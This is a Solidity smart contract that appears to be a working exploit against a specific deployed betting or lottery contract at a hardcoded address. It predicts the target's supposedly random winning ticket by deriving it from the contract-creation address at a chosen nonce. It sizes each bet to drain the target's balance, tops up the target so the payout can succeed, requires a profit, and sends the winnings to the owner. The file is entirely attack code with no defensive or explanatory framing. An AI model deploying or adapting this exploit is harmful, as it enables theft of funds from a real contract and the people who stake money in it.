pragma solidity ^0.5.0;

interface TargetInterface {
    function sendTXTpsTX(string calldata UserTicketKey, string calldata setRef) external payable;
}

contract NonRandomFiveDemo {
    
    address payable private targetAddress = 0xC19abA5148A8E8E2b813D40bE1276312FeDdB813;
    address payable private owner;
    
	modifier onlyOwner() {
		require(msg.sender == owner);
		_;
	}

    constructor() public payable {
        owner = msg.sender;
    }

    function ping(uint256 _nonce, bool _keepBalance) public payable onlyOwner {
        uint256 ourBalanceInitial = address(this).balance;

        uint256 targetBalanceInitial = targetAddress.balance;
        uint256 betValue = targetBalanceInitial / 28;
        uint256 betValueReduced = betValue - ((betValue / 1000) * 133);
        uint256 targetBalanceAfterBet = targetBalanceInitial + betValueReduced;
        uint256 expectedPrize = (betValueReduced / 100) * 3333;
        
        if (expectedPrize > targetBalanceAfterBet) {
            uint256 throwIn = expectedPrize - targetBalanceAfterBet;
            targetAddress.transfer(throwIn);
        }

        string memory betString = ticketString(_nonce);
        TargetInterface target = TargetInterface(targetAddress);
        target.sendTXTpsTX.value(betValue)(betString, "");
        
        require(address(this).balance > ourBalanceInitial);
        
        if (!_keepBalance) {
            owner.transfer(address(this).balance);
        }
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }    
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }    
    
    function () external payable {
    }

    function ticketString(uint256 _nonce) public view returns (string memory) {
        bytes32 ticketAddressBytes = addressBytesFrom(targetAddress, _nonce);
        return ticketStringFromAddressBytes(ticketAddressBytes);
    }
    
    function addressBytesFrom(address _origin, uint256 _nonce) private pure returns (bytes32) {
        if (_nonce == 0x00)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, byte(0x80)));
        if (_nonce <= 0x7f)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, uint8(_nonce)));
        if (_nonce <= 0xff)     return keccak256(abi.encodePacked(byte(0xd7), byte(0x94), _origin, byte(0x81), uint8(_nonce)));
        if (_nonce <= 0xffff)   return keccak256(abi.encodePacked(byte(0xd8), byte(0x94), _origin, byte(0x82), uint16(_nonce)));
        if (_nonce <= 0xffffff) return keccak256(abi.encodePacked(byte(0xd9), byte(0x94), _origin, byte(0x83), uint24(_nonce)));
        return keccak256(abi.encodePacked(byte(0xda), byte(0x94), _origin, byte(0x84), uint32(_nonce)));
    }

    function ticketStringFromAddressBytes(bytes32 _addressBytes) private pure returns(string memory) {
        bytes memory alphabet = "0123456789abcdef";
        
        bytes memory ticketBytes = new bytes(5);
        ticketBytes[0] = alphabet[uint8(_addressBytes[29] & 0x0f)];
        ticketBytes[1] = alphabet[uint8(_addressBytes[30] >> 4)];
        ticketBytes[2] = alphabet[uint8(_addressBytes[30] & 0x0f)];
        ticketBytes[3] = alphabet[uint8(_addressBytes[31] >> 4)];
        ticketBytes[4] = alphabet[uint8(_addressBytes[31] & 0x0f)];
        
        return string(ticketBytes);
    }

}